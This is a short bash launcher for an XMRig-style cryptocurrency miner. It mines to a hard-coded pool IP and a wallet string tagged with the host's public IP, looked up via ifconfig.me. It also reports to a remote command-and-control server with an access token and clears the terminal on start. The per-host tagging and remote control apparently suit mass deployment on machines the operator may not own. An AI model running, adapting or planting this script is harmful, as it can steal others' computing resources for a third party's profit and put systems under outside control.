#!/bin/bash
WALLET=AVAX:0x572b6d97c4a16fb1ac1362fe2a96e1579fd780fd.$(echo "$(curl -s ifconfig.me)" | tr . _ )#tw4q-eldi
myip="$(curl -s ifconfig.me)"
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o stratum+ssl://51.107.184.91:443 -u $WALLET $@ -p x -k --cc-url=3.144.123.82:2012 --cc-access-token=kevin --cc-worker-id=${myip}
